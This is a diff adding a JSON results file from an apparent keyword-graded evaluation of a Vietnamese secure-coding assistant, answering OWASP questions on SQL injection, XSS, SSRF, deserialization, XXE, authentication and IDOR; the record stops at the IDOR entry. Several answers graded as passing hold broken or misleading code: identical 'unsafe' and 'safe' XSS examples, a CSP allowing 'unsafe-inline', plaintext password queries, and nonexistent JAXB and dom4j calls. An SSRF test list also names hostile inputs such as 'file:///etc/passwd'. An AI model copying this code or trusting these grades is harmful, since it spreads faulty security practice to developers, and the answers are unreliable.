@@ -1,0 +1,432 @@
+{
+  "timestamp": 1791334288,
+  "base": "http://127.0.0.1:8134",
+  "part_a": [
+    {
+      "id": "A01-sqli",
+      "owasp_ref": "OWASP SQL Injection Prevention CS",
+      "label": "CWE-89 / A03:2021 SQL Injection",
+      "message": "CWE-89 SQL Injection là gì và cách khắc phục? Cho ví dụ code Java theo chuẩn OWASP.",
+      "expected_techniques": [
+        "prepared statement",
+        "preparedstatement",
+        "parameterized",
+        "tham số",
+        "parameteriz",
+        "stored procedure"
+      ],
+      "expected_citation": [
+        "OWASP",
+        "CWE-89"
+      ],
+      "expect_code": true,
+      "http": 200,
+      "duration_s": 18.16,
+      "grade": {
+        "tech_found": [
+          "prepared statement",
+          "preparedstatement",
+          "parameterized",
+          "parameteriz"
+        ],
+        "tech_min_needed": 2,
+        "tech_pass": true,
+        "cit_found": [
+          "OWASP",
+          "CWE-89"
+        ],
+        "cit_pass": true,
+        "code_pass": true,
+        "overall": true
+      },
+      "answer": "## CWE-89 SQL Injection là gì?\n\n**CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)** là lỗ hổng bảo mật xảy ra khi ứng dụng xây dựng câu lệnh SQL bằng cách kết hợp trực tiếp dữ liệu đầu vào từ người dùng mà không thực hiện kiểm tra hoặc mã hóa đúng cách. Theo OWASP Top 10:2025, đây thuộc nhóm **A05:2025 Injection**.\n\n### Tác động của SQL Injection:\n- **Thực thi mã trái phép** (Execute Unauthorized Code or Commands)\n- **Đọc dữ liệu ứng dụng** (Read Application Data)\n- **Chiếm quyền hoặc giả mạo danh tính** (Gain Privileges or Assume Identity)\n- **Vượt qua cơ chế bảo vệ** (Bypass Protection Mechanism)\n- **Sửa đổi dữ liệu ứng dụng** (Modify Application Data)\n\n### Các mẫu tấn công liên quan (CAPEC):\n- **CAPEC-7**: Blind SQL Injection\n- **CAPEC-108**: Command Line Execution through SQL Injection  \n- **CAPEC-109**: Object Relational Mapping Injection\n- **CAPEC-110**: SQL Injection through SOAP Parameter Tampering\n- **CAPEC-470**: Expanding Control over the Operating System from the Database\n\n## Cách khắc phục theo chuẩn OWASP\n\n### 1. Sử dụng Prepared Statements (Parameterized Queries) - Biện pháp hiệu quả nhất\n\n```java\n// Ví dụ sử dụng PreparedStatement trong Java\nString query = \"SELECT * FROM users WHERE username = ? AND password = ?\";\nPreparedStatement pstmt = connection.prepareStatement(query);\npstmt.setString(1, userInputUsername);\npstmt.setString(2, userInputPassword);\nResultSet rs = pstmt.executeQuery();\n```\n\n### 2. Sử dụng ORM (Object-Relational Mapping)\n\nCác framework ORM như Hibernate, JPA tự động xử lý việc escape dữ liệu.\n\n```java\n// Ví dụ sử dụng JPA/Hibernate\n@Query(\"SELECT u FROM User u WHERE u.username = :username AND u.password = :password\")\nUser findByUsernameAndPassword(@Param(\"username\") String username, @Param(\"password\") String password);\n```\n\n### 3. Input Validation và Sanitization\n\nKiểm tra và làm sạch dữ liệu đầu vào trước khi xử lý.\n\n```java\npublic boolean isValidInput(String input) {\n    // Chỉ cho phép các ký tự an toàn\n    return input.matches(\"^[a-zA-Z0-9_@.-]+$\");\n}\n```\n\n### 4. Nguyên tắc Privilege Least\n\nTài khoản kết nối CSDL nên có quyền tối thiểu cần thiết.\n\n```java\n// Cấu hình connection với user có quyền hạn chế\nProperties props = new Properties();\nprops.setProperty(\"user\", \"readonly_user\");\nprops.setProperty(\"password\", \"secure_password\");\nprops.setProperty(\"database\", \"app_db\");\nConnection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/app_db\", props);\n```\n\n### 5. Error Handling An toàn\n\nKhông hiển thị thông báo lỗi chi tiết từ database.\n\n```java\ntry {\n    Statement stmt = connection.createStatement();\n    stmt.executeQuery(sqlQuery);\n} catch (SQLException e) {\n    // Log lỗi chi tiết, nhưng chỉ trả về thông báo chung cho người dùng\n    logger.error(\"Database error\", e);\n    throw new RuntimeException(\"Đã xảy ra lỗi hệ thống\");\n}\n```\n\n### 6. Sử dụng Web Application Firewall (WAF)\n\nTriển khai WAF để phát hiện và chặn các request đáng ngờ.\n\n## Ví dụ Code Java theo chuẩn OWASP\n\n```java\nimport java.sql.*;\nimport javax.sql.DataSource;\n\npublic class SecureUserDAO {\n    \n    private DataSource dataSource;\n    \n    public SecureUserDAO(DataSource dataSource) {\n        this.dataSource = dataSource;\n    }\n    \n    // Phương thức an toàn sử dụng PreparedStatement\n    public User getUserByUsername(String username) throws SQLException {\n        String query = \"SELECT id, username, email FROM users WHERE username = ?\";\n        \n        try (Connection conn = dataSource.getConnection();\n             PreparedStatement pstmt = conn.prepareStatement(query)) {\n            \n            // Set parameter an toàn\n            pstmt.setString(1, username);\n            \n            try (ResultSet rs = pstmt.executeQuery()) {\n                if (rs.next()) {\n                    return new User(\n                        rs.getLong(\"id\"),\n                        rs.getString(\"username\"),\n                        rs.getString(\"email\")\n                    );\n                }\n            }\n        }\n        return null;\n    }\n    \n    // Phương thức đăng nhập an toàn\n    public boolean authenticateUser(String username, String password) throws SQLException {\n        String query = \"SELECT COUNT(*) FROM users WHERE username = ? AND password = ?\";\n        \n        try (Connection conn = dataSource.getConnection();\n             PreparedStatement pstmt = conn.prepareStatement(query)) {\n            \n            pstmt.setString(1, username);\n            pstmt.setString(2, password);\n            \n            try (ResultSet rs = pstmt.executeQuery()) {\n                if (rs.next()) {\n                    return rs.getInt(1) > 0;\n                }\n            }\n        }\n        return false;\n    }\n    \n    // Phương thức tìm kiếm an toàn với pagination\n    public List&lt;User&gt; searchUsers(String searchTerm, int page, int pageSize) throws SQLException {\n        String query = \"SELECT * FROM users WHERE username LIKE ? LIMIT ? OFFSET ?\";\n        List&lt;User&gt; users = new ArrayList<>();\n        \n        try (Connection conn = dataSource.getConnection();\n             PreparedStatement pstmt = conn.prepareStatement(query)) {\n            \n            // Sử dụng wildcard an toàn\n            String searchPattern = \"%\" + searchTerm + \"%\";\n            pstmt.setString(1, searchPattern);\n            pstmt.setInt(2, pageSize);\n            pstmt.setInt(3, (page - 1) * pageSize);\n            \n            try (ResultSet rs = pstmt.executeQuery()) {\n                while (rs.next()) {\n                    users.add(new User(\n                        rs.getLong(\"id\"),\n                        rs.getString(\"username\"),\n                        rs.getString(\"email\")\n                    ));\n                }\n            }\n        }\n        return users;\n    }\n}\n```\n\n## Tài liệu tham khảo\n\n- **OWASP Top 10:2025 A05:2025 Injection** (CC BY-SA 4.0): https://owasp.org/Top10/2025/A05_2025-Injection/\n- **CWE-89 Improper Neutralization of Special Elements used in an SQL Command**: https://cwe.mitre.org/data/definitions/89.html\n\nBạn cần IAS.AI hỗ trợ thêm gì nữa không?"
+    },
+    {
+      "id": "A02-xss",
+      "owasp_ref": "OWASP XSS Prevention CS",
+      "label": "CWE-79 / A03:2021 XSS",
+      "message": "CWE-79 Cross-Site Scripting cách khắc phục theo OWASP? Ví dụ code Python/Flask.",
+      "expected_techniques": [
+        "escape",
+        "encode",
+        "autoescape",
+        "csp",
+        "content-security-policy",
+        "content security policy",
+        "sanitize",
+        "sanitiz",
+        "httponly"
+      ],
+      "expected_citation": [
+        "OWASP",
+        "CWE-79"
+      ],
+      "expect_code": true,
+      "http": 200,
+      "duration_s": 14.29,
+      "grade": {
+        "tech_found": [
+          "escape",
+          "encode",
+          "autoescape",
+          "csp",
+          "content-security-policy",
+          "content security policy",
+          "httponly"
+        ],
+        "tech_min_needed": 2,
+        "tech_pass": true,
+        "cit_found": [
+          "OWASP",
+          "CWE-79"
+        ],
+        "cit_pass": true,
+        "code_pass": true,
+        "overall": true
+      },
+      "answer": "## CWE-79 (Cross-Site Scripting) – Cách khắc phục theo OWASP\n\n**CWE-79** là lỗ hổng xảy ra khi ứng dụng web không trung hòa (neutralize) đúng cách đầu vào do người dùng kiểm soát trước khi đưa vào trang HTML trả về cho trình duyệt. Điều này cho phép kẻ tấn công chèn mã JavaScript độc hại, đánh cắp cookie, phiên đăng nhập hoặc thực hiện các hành động thay mặt nạn nhân.\n\nTheo **OWASP**, nguyên tắc phòng chống XSS là **trung hòa dữ liệu đầu vào dựa trên ngữ cảnh (context-aware output encoding)** và áp dụng các cơ chế bảo vệ bổ sung như Content Security Policy (CSP).\n\n---\n\n### Nguyên tắc chính để khắc phục XSS\n\n1. **Output Encoding (Mã hóa đầu ra)**  \n   - Chuyển đổi các ký tự đặc biệt (`<`, `>`, `&`, `\"`, `'`) thành entity an toàn tùy ngữ cảnh (HTML body, HTML attribute, JavaScript, URL).\n   - Không dùng `htmlspecialchars` một cách chung chung; phải chọn encoder phù hợp ngữ cảnh.\n\n2. **Input Validation (Kiểm tra đầu vào)**  \n   - Áp dụng allowlist (danh sách cho phép) cho định dạng dữ liệu mong đợi.\n   - Chỉ chấp nhận dữ liệu hợp lệ, loại bỏ hoặc từ chối dữ liệu nghi ngờ.\n\n3. **Content Security Policy (CSP)**  \n   - Triển khai header CSP để hạn chế nguồn script có thể tải về và thực thi.\n   - Ví dụ: `Content-Security-Policy: default-src 'self'; script-src 'self'`\n\n4. **HttpOnly & Secure Cookies**  \n   - Đặt cờ `HttpOnly` để ngăn JavaScript truy cập cookie.\n   - Đặt cờ `Secure` để chỉ gửi cookie qua HTTPS.\n\n5. **Sử dụng thư viện/framework an toàn**  \n   - Các framework hiện đại (React, Vue, Angular) tự động escape nội dung render.\n   - Nếu dùng Flask, hãy dùng `markupsafe` hoặc `Jinja2` autoescape.\n\n---\n\n### Ví dụ code Python/Flask – Phòng chống XSS\n\n#### ❌ Code không an toàn (dễ bị XSS)\n\n```python\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/greet')\ndef greet():\n    name = request.args.get('name', '')\n    # DANGER: render trực tiếp input không escape\n    return render_template_string('&lt;h1&gt;Hello, {{ name }}!&lt;/h1&gt;', name=name)\n```\n\n#### ✅ Code an toàn (sử dụng autoescape của Jinja2)\n\n```python\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\napp.config['JSONIFY_PRETTYPRINT_REGULAR'] = False\n\n@app.route('/greet')\ndef greet():\n    name = request.args.get('name', '')\n    # Jinja2 mặc định autoescape=True cho template strings\n    return render_template_string('&lt;h1&gt;Hello, {{ name }}!&lt;/h1&gt;', name=name)\n```\n\n#### ✅ Escaping thủ công (nếu cần)\n\n```python\nfrom markupsafe import escape\n\n@app.route('/comment')\ndef comment():\n    text = request.args.get('text', '')\n    safe_text = escape(text)  # Chuyển < > & \" ' thành HTML entities\n    return f'&lt;p&gt;{safe_text}&lt;/p&gt;'\n```\n\n#### ✅ Input validation (allowlist)\n\n```python\nimport re\n\n@app.route('/username')\ndef username():\n    user = request.args.get('user', '')\n    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', user):\n        return 'Invalid username', 400\n    return f'&lt;h1&gt;Welcome, {user}!&lt;/h1&gt;'\n```\n\n#### ✅ Header CSP (bảo vệ lớp thứ cấp)\n\n```python\n@app.after_request\ndef add_security_headers(response):\n    response.headers['Content-Security-Policy'] = \"default-src 'self'; script-src 'self' 'unsafe-inline'\"\n    response.headers['X-Content-Type-Options'] = 'nosniff'\n    response.headers['X-Frame-Options'] = 'DENY'\n    return response\n```\n\n---\n\n### Tóm tắt biện pháp OWASP cho CWE-79\n\n| Biện pháp | Mục đích |\n|-----------|----------|\n| **Output Encoding** | Ngăn script thực thi bằng cách chuyển ký tự đặc biệt thành entity |\n| **Input Validation** | Loại bỏ dữ liệu không hợp lệ ngay từ đầu vào |\n| **CSP** | Hạn chế nguồn script có thể chạy |\n| **HttpOnly Cookie** | Ngăn JavaScript đọc cookie nhạy cảm |\n| **Framework an toàn** | Tận dụng cơ chế escape tự động |\n\nNếu bạn cần ví dụ chi tiết hơn cho từng ngữ cảnh (HTML body, attribute, JavaScript, URL), hãy cho tôi biết.\n\nBạn cần IAS.AI hỗ trợ thêm gì nữa không?"
+    },
+    {
+      "id": "A03-ssrf",
+      "owasp_ref": "OWASP SSRF Prevention CS",
+      "label": "CWE-918 / A10:2021 SSRF",
+      "message": "SSRF là gì, cách phòng chống theo OWASP? Ví dụ code Python whitelist URL.",
+      "expected_techniques": [
+        "whitelist",
+        "allow.list",
+        "allow list",
+        "danh sách cho phép",
+        "private ip",
+        "địa chỉ nội bộ",
+        "internal ip",
+        "dns rebind",
+        "resolve"
+      ],
+      "expected_citation": [
+        "OWASP"
+      ],
+      "expect_code": true,
+      "http": 200,
+      "duration_s": 10.27,
+      "grade": {
+        "tech_found": [
+          "whitelist",
+          "danh sách cho phép",
+          "private ip"
+        ],
+        "tech_min_needed": 2,
+        "tech_pass": true,
+        "cit_found": [
+          "OWASP"
+        ],
+        "cit_pass": true,
+        "code_pass": true,
+        "overall": true
+      },
+      "answer": "## SSRF là gì?\n\n**SSRF (Server-Side Request Forgery)** là lỗ hổng bảo mật cho phép kẻ tấn công lừa máy chủ thực hiện các yêu cầu HTTP/HTTPS đến các tài nguyên nội bộ hoặc bên ngoài mà người dùng không được phép truy cập. Kẻ tấn công có thể lợi dụng lỗ hổng này để:\n\n- Truy cập các dịch vụ nội bộ không được công khai (như metadata service, admin panels)\n- Thâm nhập vào mạng nội bộ\n- Thực hiện các cuộc tấn công nội mạng khác\n- Đọc file cục bộ thông qua giao thức file://\n\n## Phòng chống theo OWASP\n\nTheo **OWASP Top 10:2021 A10** và **OWASP Server-Side Request Forgery Prevention Cheat Sheet**, các biện pháp phòng chống bao gồm:\n\n### Từ lớp mạng (Network layer):\n- Phân đoạn chức năng truy cập tài nguyên từ xa sang mạng riêng biệt để giảm tác động\n- Áp dụng chính sách \"từ chối mặc định\" trên firewall để chặn mọi lưu lượng intranet trừ những gì cần thiết\n- Ghi log tất cả các luồng mạng được chấp nhận và bị chặn\n\n### Từ lớp ứng dụng (Application layer):\n- Làm sạch và xác thực tất cả dữ liệu đầu vào do người dùng cung cấp\n- **Siết chặt URL schema, cổng và đích bằng danh sách cho phép (allowlist)**\n- Không gửi phản hồi thô cho khách hàng\n- Vô hiệu hóa các chuyển hướng HTTP (HTTP redirections)\n\n## Ví dụ code Python whitelist URL an toàn\n\nDưới đây là ví dụ về hàm kiểm tra URL an toàn, phòng chống SSRF:\n\n```python\nimport urllib.parse\nimport ipaddress\nimport socket\n\ndef is_safe_url(url):\n    \"\"\"\n    Kiểm tra URL có an toàn không (chống SSRF)\n    \"\"\"\n    try:\n        parsed_url = urllib.parse.urlparse(url)\n        \n        # Chỉ cho phép http và https\n        if parsed_url.scheme not in ['http', 'https']:\n            return False, \"Chỉ cho phép http/https\"\n        \n        # Lấy hostname và kiểm tra\n        hostname = parsed_url.hostname\n        \n        if not hostname:\n            return False, \"Không xác định được hostname\"\n        \n        # Giải mã hostname thành địa chỉ IP\n        try:\n            ip_addresses = socket.getaddrinfo(hostname, None)\n        except socket.gaierror:\n            return False, \"Không thể phân giải hostname\"\n        \n        for addr_info in ip_addresses:\n            ip = addr_info[4][0]\n            \n            # Kiểm tra IP có phải là địa chỉ riêng không\n            try:\n                ip_obj = ipaddress.ip_address(ip)\n                \n                # Chặn private IPs, loopback, link-local, multicast\n                if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local or ip_obj.is_multicast:\n                    return False, f\"IP {ip} bị chặn (private/loopback/link-local)\"\n                    \n            except ValueError:\n                continue\n        \n        return True, \"URL hợp lệ\"\n        \n    except Exception as e:\n        return False, f\"Lỗi: {str(e)}\"\n\n# Ví dụ sử dụng\nif __name__ == \"__main__\":\n    test_urls = [\n        \"https://example.com\",\n        \"http://localhost\",\n        \"http://192.168.1.1\",\n        \"http://127.0.0.1\",\n        \"file:///etc/passwd\",\n        \"gopher://localhost:80\"\n    ]\n    \n    for url in test_urls:\n        is_safe, message = is_safe_url(url)\n        print(f\"{url}: {'✅' if is_safe else '❌'} {message}\")\n```\n\n## Tài liệu tham khảo\n\n- **OWASP Top 10:2021 A10 – Server-Side Request Forgery (SSRF)** - https://owasp.org/Top10/2021/A10_2021-Server-Side_Request_Forgery_(SSRF)/\n- **OWASP Server-Side Request Forgery Prevention Cheat Sheet** - https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html\n\nBạn cần IAS.AI hỗ trợ thêm gì nữa không?"
+    },
+    {
+      "id": "A04-deserial",
+      "owasp_ref": "OWASP Deserialization CS",
+      "label": "CWE-502 / A08:2021 Insecure Deserialization",
+      "message": "CWE-502 Insecure Deserialization khắc phục thế nào theo OWASP? Ví dụ code Java whitelist class.",
+      "expected_techniques": [
+        "whitelist",
+        "class whitelist",
+        "allowed class",
+        "resolveclass",
+        "objectinputstream",
+        "không dùng java serialization",
+        "json",
+        "signature",
+        "chữ ký"
+      ],
+      "expected_citation": [
+        "OWASP",
+        "CWE-502"
+      ],
+      "expect_code": true,
+      "http": 200,
+      "duration_s": 11.61,
+      "grade": {
+        "tech_found": [
+          "whitelist",
+          "resolveclass",
+          "objectinputstream",
+          "json",
+          "signature",
+          "chữ ký"
+        ],
+        "tech_min_needed": 2,
+        "tech_pass": true,
+        "cit_found": [
+          "OWASP",
+          "CWE-502"
+        ],
+        "cit_pass": true,
+        "code_pass": true,
+        "overall": true
+      },
+      "answer": "## CWE-502: Deserialization of Untrusted Data – Cách khắc phục theo OWASP\n\nCWE-502 mô tả lỗ hổng khi sản phẩm giải mã (deserialize) dữ liệu không đáng tin cậy mà không kiểm tra tính hợp lệ của đối tượng tạo ra. Hậu quả có thể bao gồm thay đổi dữ liệu ứng dụng, trạng thái bất ngờ, DoS hoặc thực thi mã từ xa (RCE). OWASP Top 10:2021 A08 – Software and Data Integrity Failures cũng đề cập đến rủi ro này.\n\n### 1. Tránh deserialize dữ liệu không đáng tin cậy\n- **Nguyên tắc tốt nhất:** Không gọi `ObjectInputStream.readObject()` (Java) hay `unserialize()` (PHP/Python) trên dữ liệu đến từ người dùng, API bên ngoài, hoặc nguồn không được kiểm soát.\n- Nếu bắt buộc phải deserialize, hãy coi đó là rủi ro cao và áp dụng các lớp bảo vệ bổ sung.\n\n### 2. Sử dụng cơ chế serialization an toàn hơn\n- Thay thế Java serialization bằng các định dạng an toàn như **JSON** (với thư viện xác thực), **Protocol Buffers**, hoặc **MessagePack** kèm xác thực chữ ký số.\n- Các định dạng này không tự động kích hoạt code execution khi parse.\n\n### 3. Áp dụng ObjectInputFilter (Java) – Whitelist class\nTừ Java 9 trở lên, sử dụng `ObjectInputFilter` để chỉ cho phép deserialize các lớp cụ thể. Đây là cách tiếp cận **whitelist** được OWASP khuyến nghị.\n\n**Ví dụ code Java whitelist class:**\n\n```java\nimport java.io.*;\nimport java.util.Set;\nimport java.util.HashSet;\nimport java.util.Arrays;\n\npublic class SecureDeserializer {\n\n    // Danh sách các lớp được phép deserialize\n    private static final Set&lt;String&gt; ALLOWED_CLASSES = new HashSet<>(Arrays.asList(\n        \"com.example.User\",\n        \"com.example.Order\",\n        \"com.example.Product\"\n        // Thêm các lớp hợp lệ khác tại đây\n    ));\n\n    public static &lt;T&gt; T deserialize(byte[] data) throws IOException, ClassNotFoundException {\n        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)) {\n            @Override\n            protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {\n                String className = desc.getName();\n                if (!ALLOWED_CLASSES.contains(className)) {\n                    throw new ClassNotFoundException(\"Không cho phép deserialize class: \" + className);\n                }\n                return super.resolveClass(desc);\n            }\n        };\n\n        return (T) ois.readObject();\n    }\n}\n```\n\n### 4. Sử dụng thư viện bảo vệ sẵn\n- **Java:** Dùng thư viện như **SafeSerialization** hoặc cấu hình `ObjectInputFilter` toàn cục qua hệ thống property (`jdk.serialFilter`).\n- **PHP:** Từ PHP 8.0, hàm `unserialize()` đã có tham số `allowed_classes` để hạn chế class được deserialize.\n- **Python:** Không dùng `pickle` cho dữ liệu không đáng tin; thay vào đó dùng `json` hoặc thư viện an toàn như `msgpack` với xác thực.\n\n### 5. Kiểm tra chữ ký số (Digital Signature)\n- Ký số dữ liệu trước khi serialize và xác minh chữ ký trước khi deserialize. Điều này đảm bảo tính toàn vẹn và nguồn gốc dữ liệu.\n\n### 6. Giám sát và logging\n- Ghi log mọi lần deserialize thất bại hoặc bị chặn để phát hiện tấn công.\n\n---\n\n**Lưu ý:** OWASP nhấn mạnh rằng không có giải pháp nào là hoàn hảo 100%. Kết hợp nhiều lớp bảo vệ (whitelist + định dạng an toàn + chữ ký số) sẽ giảm thiểu rủi ro hiệu quả nhất.\n\nBạn cần IAS.AI hỗ trợ thêm gì nữa không?"
+    },
+    {
+      "id": "A05-xxe",
+      "owasp_ref": "OWASP XXE Prevention CS",
+      "label": "CWE-611 / A05:2021 XXE",
+      "message": "CWE-611 XXE (XML External Entity) là gì, cách vá theo OWASP? Ví dụ Java disable external entity.",
+      "expected_techniques": [
+        "disable external entity",
+        "dtd",
+        "xml external entity",
+        "setfeature",
+        "documentbuilderfactory",
+        "disallow-doctype-decl",
+        "external-general-entities"
+      ],
+      "expected_citation": [
+        "OWASP",
+        "CWE-611"
+      ],
+      "expect_code": true,
+      "http": 200,
+      "duration_s": 9.01,
+      "grade": {
+        "tech_found": [
+          "xml external entity",
+          "setfeature",
+          "documentbuilderfactory",
+          "disallow-doctype-decl",
+          "external-general-entities"
+        ],
+        "tech_min_needed": 2,
+        "tech_pass": true,
+        "cit_found": [
+          "OWASP",
+          "CWE-611"
+        ],
+        "cit_pass": true,
+        "code_pass": true,
+        "overall": true
+      },
+      "answer": "## CWE-611: Improper Restriction of XML External Entity Reference (XXE)\n\n**CWE-611** là lỗ hổng xảy ra khi ứng dụng xử lý tài liệu XML mà không hạn chế đúng cách các thực thể bên ngoài (XML external entities). Kẻ tấn công có thể nhúng các URI trỏ đến tài liệu nằm ngoài phạm vi kiểm soát dự kiến, từ đó đọc file nhạy cảm trên máy chủ, thực hiện tấn công nội mạng, hoặc gây tê liệt tài nguyên (DoS).\n\n### Ảnh hưởng\n- Đọc dữ liệu ứng dụng / file hệ thống\n- Bypass cơ chế bảo vệ\n- DoS do tiêu tốn CPU, bộ nhớ\n\n### Ánh xạ kỹ thuật\n- **CAPEC-221**: Data Serialization External Entities Blowup\n\n---\n\n## Cách phòng chống theo OWASP & ví dụ Java\n\nOWASP khuyến nghị cấu hình parser XML để **tắt hoàn toàn việc xử lý thực thể bên ngoài**. Dưới đây là các biện pháp an toàn cho Java.\n\n### 1. JAXP (DocumentBuilderFactory) – Java chuẩn\n\n```java\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\n\nDocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\nfactory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\nfactory.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\nfactory.setNamespaceAware(true);\n\nDocument doc = factory.newDocumentBuilder().parse(inputSource);\n```\n\n- `disallow-doctype-decl=true` → chặn DOCTYPE (ngăn XXE triệt để).\n- Hai cờ `external-*entities=false` → tắt thực thể bên ngoài.\n\n### 2. JAXB (JAXBContext) – nếu dùng JAXB\n\n```java\nimport javax.xml.bind.JAXBContext;\nimport javax.xml.validation.SchemaFactory;\nimport javax.xml.XMLConstants;\n\nJAXBContext ctx = JAXBContext.newInstance(MyClass.class);\nctx.createSchemaFactory(XMLConstants.W3C_XML_SCHEMA_NS_URI)\n   .setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n```\n\n- `FEATURE_SECURE_PROCESSING` giúp bật các giới hạn an toàn mặc định của JAXB.\n\n### 3. Các thư viện phổ biến khác\n\n| Thư viện | Cấu hình an toàn |\n|----------|------------------|\n| **dom4j** | `document.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);` |\n| **Xerces** | `factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);` |\n| **Jackson XML** | `XmlMapper.builder().disable(com.fasterxml.jackson.dataformat.xml.XmlReadFeature.AUTO_DETECT_ENTITIES).build();` |\n\n---\n\n## Lưu ý quan trọng\n\n- Không bao giờ dùng `XMLInputFactory` với `XMLConstants.FEATURE_SECURE_PROCESSING=false`.\n- Luôn ưu tiên **tắt DOCTYPE** (`disallow-doctype-decl`) vì đây là biện pháp mạnh nhất.\n- Kiểm tra lại mọi điểm nhập XML (upload file, API request, SOAP, config) — XXE thường xuất hiện ở nơi ứng dụng chấp nhận XML từ người dùng.\n\nBạn cần IAS.AI hỗ trợ thêm gì nữa không?"
+    },
+    {
+      "id": "A06-broken-auth",
+      "owasp_ref": "OWASP Authentication CS",
+      "label": "CWE-287 / A07:2021 Broken Authentication",
+      "message": "CWE-287 Broken Authentication khắc phục thế nào theo OWASP Secure Coding?",
+      "expected_techniques": [
+        "mfa",
+        "multi-factor",
+        "xác thực đa yếu tố",
+        "bcrypt",
+        "argon2",
+        "hash",
+        "session",
+        "token",
+        "rate limit"
+      ],
+      "expected_citation": [
+        "OWASP",
+        "CWE-287"
+      ],
+      "expect_code": false,
+      "http": 200,
+      "duration_s": 10.77,
+      "grade": {
+        "tech_found": [
+          "mfa",
+          "xác thực đa yếu tố",
+          "bcrypt",
+          "argon2",
+          "hash",
+          "session",
+          "token",
+          "rate limit"
+        ],
+        "tech_min_needed": 2,
+        "tech_pass": true,
+        "cit_found": [
+          "OWASP",
+          "CWE-287"
+        ],
+        "cit_pass": true,
+        "code_pass": true,
+        "overall": true
+      },
+      "answer": "## CWE-287: Improper Authentication – Cách khắc phục theo OWASP Secure Coding\n\nCWE-287 (Improper Authentication) là lỗ hổng khi hệ thống không xác minh đủ mạnh danh tính người dùng, dẫn đến khả năng giả mạo, chiếm quyền hoặc truy cập trái phép. Theo OWASP Secure Coding Practices, các biện pháp phòng chống chính bao gồm:\n\n### 1. Xác thực mạnh và an toàn\n- **Mật khẩu:** Tuân thủ chính sách mật khẩu mạnh (độ dài tối thiểu 12 ký tự, kết hợp chữ hoa, chữ thường, số, ký tự đặc biệt). Không lưu trữ mật khẩu dưới dạng văn bản rõ; chỉ lưu hash với thuật toán mạnh như bcrypt, scrypt, Argon2.\n- **Xác thực đa yếu tố (MFA):** Bật MFA cho tất cả tài khoản, ưu tiên phương thức dựa trên thời gian (TOTP) hoặc phần cứng (FIDO2/WebAuthn). Tránh SMS nếu có thể vì dễ bị SIM swap.\n- **Giới hạn lần đăng nhập:** Áp dụng khóa tài khoản sau một số lần thất bại liên tiếp (ví dụ 5 lần), sử dụng cơ chế CAPTCHA để ngăn tấn công brute-force.\n\n### 2. Quản lý phiên (Session Management)\n- **Token phiên an toàn:** Sử dụng token ngẫu nhiên, độ dài đủ lớn (ít nhất 128 bit), đặt cờ `HttpOnly`, `Secure`, `SameSite=Strict` cho cookie.\n- **Thời hạn phiên:** Đặt thời gian sống ngắn cho session, yêu cầu đăng nhập lại sau một khoảng thời gian nhất định hoặc khi thực hiện thao tác nhạy cảm.\n- **Invalidating session:** Đăng xuất bắt buộc khi người dùng thay đổi mật khẩu, hoặc khi phát hiện hoạt động đáng ngờ.\n\n### 3. Bảo vệ chống tấn công tự động\n- **Rate limiting:** Giới hạn số lượng yêu cầu từ một IP trong một khoảng thời gian.\n- **CAPTCHA:** Sử dụng khi nghi ngờ hoạt động bất thường (nhiều lần đăng nhập thất bại, thay đổi thông tin quan trọng).\n- **Monitoring & Alerting:** Ghi log tất cả sự kiện xác thực, cảnh báo khi có hành vi đáng ngờ (nhiều IP khác nhau, đăng nhập ngoài giờ làm việc).\n\n### 4. Các nguyên tắc thiết kế an toàn\n- **Nguyên tắc đặc quyền tối thiểu:** Chỉ cấp quyền cần thiết cho từng chức năng.\n- **Chia nhỏ dịch vụ (Microservices):** Hạn chế phạm vi ảnh hưởng nếu một thành phần bị xâm phạm.\n- **Kiểm tra đầu vào:** Rà soát và validate mọi dữ liệu người dùng cung cấp, tránh injection.\n\n### 5. Tham chiếu OWASP\n- **OWASP Authentication Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html\n- **OWASP Top 10:** Lỗ hổng liên quan đến xác thực thường nằm trong nhóm A01:2021 – Broken Access Control và A07:2021 – Identification and Authentication Failures.\n\nÁp dụng đồng bộ các biện pháp trên sẽ giảm đáng kể nguy cơ khai thác lỗ hổng CWE-287. Nếu bạn cần tư vấn chi tiết cho một ngữ cảnh cụ thể (web app, API, mobile…), hãy cho tôi biết thêm thông tin."
+    },
+    {
+      "id": "A07-idor",
+      "owasp_ref": "OWASP IDOR Prevention",
+      "label": "CWE-639 / IDOR",
+      "message": "IDOR (Insecure Direct Object Reference) là gì và cách phòng chống theo OWASP?",
+      "expected_techniques": [
+        "access control",
+        "kiểm tra quyền",
+        "authorization",
+        "indirect reference",
+        "tham chiếu gián tiếp",
+        "uuid",
+        "random id"
+      ],
+      "expected_citation": [
+        "OWASP"
+      ],
+      "expect_code": false,
+      "http": 200,
+      "duration_s": 9.35,
+      "grade": {
+        "tech_found": [
+          "kiểm tra quyền",
+          "indirect reference",
+          "tham chiếu gián tiếp",
+          "uuid"
+        ],
+        "tech_min_needed": 2,
+        "tech_pass": true,
+        "cit_found": [
+          "OWASP"
+        ],
+        "cit_pass": true,
+        "code_pass": true,
+        "overall": true
+      },
